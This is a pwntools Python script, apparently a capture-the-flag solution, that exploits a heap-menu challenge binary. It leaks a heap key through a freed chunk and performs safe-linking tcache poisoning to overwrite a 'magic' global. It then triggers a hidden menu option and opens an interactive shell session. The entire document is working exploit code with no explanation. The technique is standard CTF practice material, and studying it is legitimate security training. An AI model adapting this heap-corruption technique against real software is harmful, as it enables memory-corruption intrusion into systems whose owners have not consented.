#!/usr/bin/env python3

from pwn import *

exe = ELF("challenge_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

gs = '''
set solib-search-path /home/huhu/my-task/pwn/daily-task/bai14/
c
'''

context.binary = exe
context.log_level= 'debug'
def start():
    if args.GDB:
        return gdb.debug(exe.path, gdbscript=gs)
    else:
        return process(exe.path)
p = start()
def choice(index):
    p.sendlineafter(b"Please input your choice > \x00", str(index).encode())
def malloc(index, size, content):
    choice(1)
    p.sendlineafter(b"Please input the chunk index > ", str(index).encode())
    p.sendlineafter(b"Please input the size > ", str(size).encode())
    p.sendafter(b"Please input the content > ", content)
def free(index):
    choice(5)
    p.sendlineafter(b"Please input the chunk index > ", str(index).encode())
def show(index):
    choice(4)
    p.sendlineafter(b"Please input the chunk index > ", str(index).encode())
def edit(index, size, content):
    choice(6)
    p.sendlineafter(b"Please input the chunk index > ", str(index).encode())
    p.sendlineafter(b"Please input the size > ", str(size).encode())
    p.sendafter(b"Please input the content > ",content)
for index in range(14):
    malloc(index, 0x78, b"\x00"*0x78)
for index in range(8):
    free(index)
show(0)
key = u32(p.recv(3) + B"\x00")
heap_page = key << 12

log.info(f"[*]heap = {hex(heap_page)}")
edit(7, 8, p64(((heap_page + 0x800) >> 12) ^ (exe.symbols['magic'] - 0x10)))
for index in range(8, 14):
    free(index)
for index in range(8):
    malloc(index, 0x78, b"\x00")
malloc(8, 0x78, p64(0x12345678))
choice(0x4D41474943)
p.sendline(str(0x12345678).encode())
p.interactive()